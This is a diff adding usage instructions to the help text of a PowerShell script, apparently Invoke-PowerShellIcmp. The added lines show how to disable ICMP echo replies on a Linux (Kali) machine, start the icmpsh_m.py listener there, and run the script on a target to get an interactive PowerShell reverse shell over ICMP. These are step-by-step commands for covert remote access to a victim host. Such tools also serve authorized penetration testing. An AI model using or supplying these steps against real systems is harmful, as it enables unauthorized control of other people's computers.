@@ -19,6 +19,14 @@ Time in seconds for which the script waits for a command from the server. Defaul
 The size of output Buffer. Defualt is 128.
 
 .EXAMPLE
+# sysctl -w net.ipv4.icmp_echo_ignore_all=1
+# python icmpsh_m.py 192.168.254.226 192.168.254.1
+
+Run above commands to start a listener on a Linux computer (tested on Kali Linux).
+icmpsh_m.py is a part of the icmpsh tools.
+
+On the target, run the below command.
+
 PS > Invoke-PowerShellIcmp-IPAddress 192.168.254.226
 
 Above shows an example of an interactive PowerShell reverse connect shell. 
